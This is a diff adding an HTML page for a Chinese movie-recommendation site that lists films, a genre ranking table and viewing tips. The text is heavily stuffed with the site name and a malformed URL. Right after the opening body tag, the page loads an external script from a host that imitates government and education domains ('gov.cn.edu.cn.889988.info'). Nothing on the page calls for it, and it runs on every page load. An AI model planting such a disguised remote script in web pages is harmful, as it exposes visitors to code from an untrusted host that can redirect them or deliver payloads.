@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>人人电影网 - 每个人的电影指南</title>
+<meta name="description" content="人人电影网(renrendianyingwang-top)是一个面向大众的电影推荐平台，提供热门推荐、类型片单、观影指南和关于我们等栏目，网址：https://renrendianyingwang-top">
+<meta name="keywords" content="人人电影网, renrendianyingwang-top, 电影推荐, 热门电影, 类型片单, 观影指南">
+<meta name="author" content="人人电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<style>
+/* ===== 全局 ===== */
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Georgia','Times New Roman','PingFang SC','Microsoft YaHei',serif;
+  background:#faf7f2;
+  color:#2c2c2c;
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:#c2410c;transition:all .3s}
+a:hover{color:#9a3412}
+.container{width:94%;max-width:1200px;margin:0 auto}
+
+/* ===== 报头 ===== */
+.masthead{
+  background:#faf7f2;
+  border-bottom:3px double #c2410c;
+  padding:1.5rem 0 1rem;
+  position:sticky;top:0;z-index:100;
+  box-shadow:0 2px 8px rgba(0,0,0,0.06);
+}
+.masthead-in{display:flex;justify-content:space-between;align-items:center}
+.paper-name{font-size:2rem;font-weight:900;color:#c2410c;letter-spacing:4px;font-family:'Georgia',serif}
+.paper-name span{color:#2c2c2c;font-weight:400;font-size:1rem;letter-spacing:2px;margin-left:.5rem}
+.navbar{display:flex;gap:1.5rem}
+.navbar a{color:#2c2c2c;font-weight:600;font-size:.9rem;padding:.3rem .6rem;border-bottom:2px solid transparent}
+.navbar a:hover{border-bottom-color:#c2410c;color:#c2410c}
+.mob-nav-btn{display:none;background:none;border:1px solid #c2410c;color:#c2410c;font-size:1.3rem;border-radius:4px;padding:.2rem .6rem;cursor:pointer}
+
+/* ===== 报头日期栏 ===== */
+.dateline{
+  background:#c2410c;color:#faf7f2;padding:.4rem 0;font-size:.8rem;letter-spacing:1px;
+}
+.dateline .container{display:flex;justify-content:space-between;align-items:center}
+
+/* ===== 头条区 ===== */
+.headline-zone{padding:3rem 0 2rem}
+.headline-grid{display:grid;grid-template-columns:2fr 1fr;gap:2rem}
+.headline-main{
+  border-right:1px solid #d4c5b0;padding-right:2rem;
+}
+.headline-main h1{
+  font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.2;margin-bottom:1rem;color:#1a1a1a;
+}
+.headline-main .url-badge{
+  display:inline-block;padding:.5rem 1.2rem;background:#fff;border:1px solid #c2410c;
+  border-radius:4px;font-family:monospace;font-size:.95rem;color:#c2410c;margin-bottom:1rem;
+}
+.headline-main p{color:#555;font-size:1.05rem;margin-bottom:1.5rem}
+.headline-main .read-btn{
+  display:inline-block;padding:.7rem 2rem;background:#c2410c;color:#faf7f2;font-weight:700;border-radius:4px;font-family:sans-serif;
+}
+.headline-main .read-btn:hover{background:#9a3412;color:#faf7f2}
+
+.headline-side{display:flex;flex-direction:column;gap:1.2rem}
+.side-item{
+  padding-bottom:1.2rem;border-bottom:1px dotted #d4c5b0;
+}
+.side-item:last-child{border-bottom:none}
+.side-item h4{font-size:1rem;color:#1a1a1a;margin-bottom:.3rem}
+.side-item p{font-size:.85rem;color:#666}
+
+@media(max-width:768px){
+  .headline-grid{grid-template-columns:1fr}
+  .headline-main{border-right:none;padding-right:0;border-bottom:1px solid #d4c5b0;padding-bottom:2rem}
+  .navbar{display:none;position:absolute;top:100%;left:0;width:100%;flex-direction:column;padding:1rem 4%;background:#faf7f2;border-bottom:2px solid #c2410c}
+  .navbar.open{display:flex}
+  .mob-nav-btn{display:block}
+}
+
+/* ===== 栏目通用 ===== */
+.section{padding:3rem 0}
+.section-title{
+  text-align:center;margin-bottom:2.5rem;position:relative;
+}
+.section-title::before{
+  content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#d4c5b0;z-index:0;
+}
+.section-title h2{
+  display:inline-block;background:#faf7f2;padding:0 1.5rem;font-size:1.8rem;font-weight:900;color:#c2410c;position:relative;z-index:1;font-family:'Georgia',serif;
+}
+
+/* ===== 栏目一：热门推荐（报纸卡片）===== */
+.news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:2rem}
+.news-card{
+  border:1px solid #d4c5b0;border-radius:4px;overflow:hidden;background:#fff;transition:all .3s;
+}
+.news-card:hover{box-shadow:0 6px 20px rgba(194,65,12,0.12)}
+.news-card-img{
+  height:180px;display:flex;align-items:center;justify-content:center;font-size:3rem;
+}
+.news-card:nth-child(1) .news-card-img{background:#fef3c7}
+.news-card:nth-child(2) .news-card-img{background:#fee2e2}
+.news-card:nth-child(3) .news-card-img{background:#dbeafe}
+.news-card:nth-child(4) .news-card-img{background:#d1fae5}
+.news-card:nth-child(5) .news-card-img{background:#f3e8ff}
+.news-card:nth-child(6) .news-card-img{background:#e0f2fe}
+.news-card-body{padding:1.2rem}
+.news-card-body h3{font-size:1.1rem;color:#1a1a1a;margin-bottom:.4rem;font-weight:700}
+.news-card-body p{font-size:.88rem;color:#555;margin-bottom:.6rem}
+.news-card-body .tag{display:inline-block;padding:.2rem .7rem;background:#faf7f2;border:1px solid #d4c5b0;border-radius:3px;font-size:.75rem;color:#c2410c;font-family:sans-serif}
+
+/* ===== 栏目二：类型片单（表格风）===== */
+.genre-table{width:100%;border-collapse:collapse;max-width:900px;margin:0 auto}
+.genre-table th{
+  background:#c2410c;color:#faf7f2;padding:1rem;text-align:left;font-weight:700;font-family:sans-serif;font-size:.95rem;
+}
+.genre-table td{
+  padding:.9rem 1rem;border-bottom:1px solid #d4c5b0;font-size:.9rem;color:#333;
+}
+.genre-table tr:hover td{background:#fff7ed}
+.genre-table tr:last-child td{border-bottom:none}
+.genre-table .rank-cell{font-weight:900;color:#c2410c;font-size:1.1rem}
+
+/* ===== 栏目三：观影指南（步骤卡）===== */
+.guide-steps{max-width:900px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1.5rem}
+.step-card{
+  background:#fff;border:1px solid #d4c5b0;border-radius:4px;padding:1.8rem 1.5rem;position:relative;transition:all .3s;
+}
+.step-card:hover{border-color:#c2410c;transform:translateY(-3px)}
+.step-num{
+  position:absolute;top:-15px;left:1.5rem;width:30px;height:30px;background:#c2410c;color:#faf7f2;
+  display:flex;align-items:center;justify-content:center;font-weight:900;border-radius:50%;font-family:sans-serif;
+}
+.step-card h4{font-size:1.05rem;color:#1a1a1a;margin-bottom:.5rem;margin-top:.5rem}
+.step-card p{font-size:.88rem;color:#555}
+
+/* ===== 栏目四：关于我们 ===== */
+.about-section{background:#fff;border:1px solid #d4c5b0;border-radius:4px;padding:3rem;max-width:800px;margin:0 auto;text-align:center}
+.about-section h3{font-size:1.6rem;color:#c2410c;margin-bottom:1rem;font-family:'Georgia',serif}
+.about-section p{color:#555;margin-bottom:1rem;font-size:1rem}
+.about-section .site-url{
+  display:inline-block;margin-top:.5rem;padding:.6rem 1.5rem;background:#faf7f2;border:1px dashed #c2410c;border-radius:4px;font-family:monospace;color:#c2410c;font-size:.95rem;
+}
+
+/* ===== 底部 ===== */
+.colophon{
+  background:#2c2c2c;color:#d4c5b0;padding:3rem 0 1.5rem;text-align:center;margin-top:4rem;
+}
+.colophon-logo{font-size:1.5rem;font-weight:900;color:#faf7f2;margin-bottom:1rem;letter-spacing:3px}
+.colophon p{color:#a8a8a8;font-size:.9rem;margin-bottom:.5rem}
+.colophon-links{display:flex;justify-content:center;gap:2rem;margin:1.5rem 0;flex-wrap:wrap}
+.colophon-links a{color:#d4c5b0;font-size:.9rem}
+.colophon-links a:hover{color:#c2410c}
+.colophon-copy{color:#777;font-size:.8rem;margin-top:2rem;border-top:1px solid #444;padding-top:1.5rem}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 报头 -->
+<div class="masthead">
+  <div class="container masthead-in">
+    <div class="paper-name">人人电影网<span>· 每日电影指南</span></div>
+    <nav class="navbar" id="navbar">
+      <a href="#home">首页</a>
+      <a href="#hot">热门推荐</a>
+      <a href="#genre">类型片单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="mob-nav-btn" onclick="document.getElementById('navbar').classList.toggle('open')">☰</button>
+  </div>
+</div>
+
+<!-- 日期栏 -->
+<div class="dateline">
+  <div class="container">
+    <span>📅 每日更新 · 2026年9月</span>
+    <span>🌐 https://renrendianyingwang-top</span>
+  </div>
+</div>
+
+<!-- 头条 -->
+<section id="home" class="headline-zone">
+  <div class="container headline-grid">
+    <div class="headline-main">
+      <div class="url-badge">🔗 https://renrendianyingwang-top</div>
+      <h1>人人电影网<br>每个人的电影指南</h1>
+      <p>人人电影网(renrendianyingwang-top)是一个面向大众的、简洁实用的电影推荐平台。无论你是资深影迷还是偶尔看看的休闲观众，这里都能帮你找到心仪的好片。没有复杂的功能，只有精心挑选的影片和真诚的推荐。</p>
+      <a href="#hot" class="read-btn">开始阅读 →</a>
+    </div>
+    <div class="headline-side">
+      <div class="side-item">
+        <h4>📰 今日头条</h4>
+        <p>本周最受关注的新片上线，编辑部第一时间点评。</p>
+      </div>
+      <div class="side-item">
+        <h4>📊 实时热度</h4>
+        <p>根据人人电影网用户浏览数据，实时更新热门榜单。</p>
+      </div>
+      <div class="side-item">
+        <h4>🎯 编辑精选</h4>
+        <p>每周五篇深度推荐，帮你避开烂片、找到好片。</p>
+      </div>
+      <div class="side-item">
+        <h4>💬 读者来信</h4>
+        <p>"人人电影网的推荐从来没让我失望过。"——忠实读者小王</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 热门推荐 -->
+<section id="hot" class="section">
+  <div class="container">
+    <div class="section-title"><h2>热门推荐</h2></div>
+    <div class="news-grid">
+      <div class="news-card">
+        <div class="news-card-img">🎭</div>
+        <div class="news-card-body">
+          <h3>绿皮书</h3>
+          <p>一段跨越种族和阶级的友谊，温暖幽默又感人至深。</p>
+          <span class="tag">喜剧/剧情</span>
+        </div>
+      </div>
+      <div class="news-card">
+        <div class="news-card-img">🚀</div>
+        <div class="news-card-body">
+          <h3>火星救援</h3>
+          <p>马特·达蒙独自在火星种土豆求生，硬科幻+幽默感完美结合。</p>
+          <span class="tag">科幻/冒险</span>
+        </div>
+      </div>
+      <div class="news-card">
+        <div class="news-card-img">🎪</div>
+        <div class="news-card-body">
+          <h3>大鱼</h3>
+          <p>蒂姆·伯顿的奇幻之作，关于一个永远在讲故事的父亲。</p>
+          <span class="tag">奇幻/剧情</span>
+        </div>
+      </div>
+      <div class="news-card">
+        <div class="news-card-img">🕵️</div>
+        <div class="news-card-body">
+          <h3>利刃出鞘</h3>
+          <p>现代版阿加莎式推理，丹尼尔·克雷格的南方口音令人难忘。</p>
+          <span class="tag">悬疑/喜剧</span>
+        </div>
+      </div>
+      <div class="news-card">
+        <div class="news-card-img">❤️</div>
+        <div class="news-card-body">
+          <h3>爱在黎明破晓前</h3>
+          <p>两个陌生人在火车上相遇，用一整个夜晚的对话完成灵魂的交汇。</p>
+          <span class="tag">爱情/文艺</span>
+        </div>
+      </div>
+      <div class="news-card">
+        <div class="news-card-img">🏹</div>
+        <div class="news-card-body">
+          <h3>英雄</h3>
+          <p>张艺谋的色彩美学巅峰，刺客无名与秦王的对决背后是天下大义。</p>
+          <span class="tag">武侠/历史</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 类型片单 -->
+<section id="genre" class="section" style="background:#fefcf8">
+  <div class="container">
+    <div class="section-title"><h2>类型片单</h2></div>
+    <table class="genre-table">
+      <thead>
+        <tr><th>排名</th><th>影片名称</th><th>类型</th><th>推荐理由</th><th>评分</th></tr>
+      </thead>
+      <tbody>
+        <tr><td class="rank-cell">1</td><td>阿甘正传</td><td>剧情/励志</td><td>人生就像一盒巧克力，永远不知道下一颗是什么味道。</td><td>9.5</td></tr>
+        <tr><td class="rank-cell">2</td><td>美丽人生</td><td>剧情/战争</td><td>父亲用谎言保护儿子的童年，最伟大的父爱。</td><td>9.4</td></tr>
+        <tr><td class="rank-cell">3</td><td>寻梦环游记</td><td>动画/音乐</td><td>关于记忆与遗忘的温暖故事，皮克斯巅峰之一。</td><td>9.3</td></tr>
+        <tr><td class="rank-cell">4</td><td>谍影重重</td><td>动作/悬疑</td><td>杰森·伯恩的失忆追凶之旅，动作片标杆。</td><td>9.0</td></tr>
+        <tr><td class="rank-cell">5</td><td>天使爱美丽</td><td>爱情/喜剧</td><td>巴黎蒙马特的浪漫童话，每一帧都像油画。</td><td>8.9</td></tr>
+        <tr><td class="rank-cell">6</td><td>七宗罪</td><td>悬疑/犯罪</td><td>大卫·芬奇的黑暗杰作，结局令人不寒而栗。</td><td>8.8</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section id="guide" class="section">
+  <div class="container">
+    <div class="section-title"><h2>观影指南</h2></div>
+    <div class="guide-steps">
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <h4>确定心情</h4>
+        <p>想放松就选喜剧，想思考就选剧情，想刺激就选动作。跟着心情选片永远不会错。</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <h4>查看推荐</h4>
+        <p>浏览人人电影网的每日推荐和类型片单，找到符合你当下需求的影片。</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <h4>阅读简介</h4>
+        <p>花30秒看看剧情简介和标签，确认是不是你想看的类型，避免踩雷。</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">4</div>
+        <h4>开始观影</h4>
+        <p>准备好零食和饮料，关掉手机通知，给自己一段完整的观影时光。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" class="section" style="background:#fefcf8">
+  <div class="container">
+    <div class="about-section">
+      <h3>关于人人电影网</h3>
+      <p>人人电影网（网址：https://renrendianyingwang-top）是一个面向所有人的电影推荐平台。我们相信每个人都能找到属于自己的好电影，关键在于有人帮你筛选和推荐。</p>
+      <p>我们的编辑团队每天从海量影片中精选出值得观看的作品，按类型、心情、场景分类整理，让你在3分钟内找到想看的片。不做复杂的评分系统，不做花哨的社交功能，只做最纯粹的推荐。</p>
+      <p>人人电影网——让每个人都能轻松找到好电影。</p>
+      <div class="site-url">🌐 https://renrendianyingwang-top</div>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<div class="colophon">
+  <div class="container">
+    <div class="colophon-logo">人人电影网</div>
+    <p>网址：https://renrendianyingwang-top</p>
+    <p>关键词：人人电影网 / renrendianyingwang-top</p>
+    <div class="colophon-links">
+      <a href="#home">首页</a>
+      <a href="#hot">热门推荐</a>
+      <a href="#genre">类型片单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="colophon-copy">&copy; 2026 人人电影网(renrendianyingwang-top) · 示例展示页 · 内链使用 # 占位</div>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',()=>document.getElementById('navbar').classList.remove('open'));
+});
+</script>
+</body>
+</html>
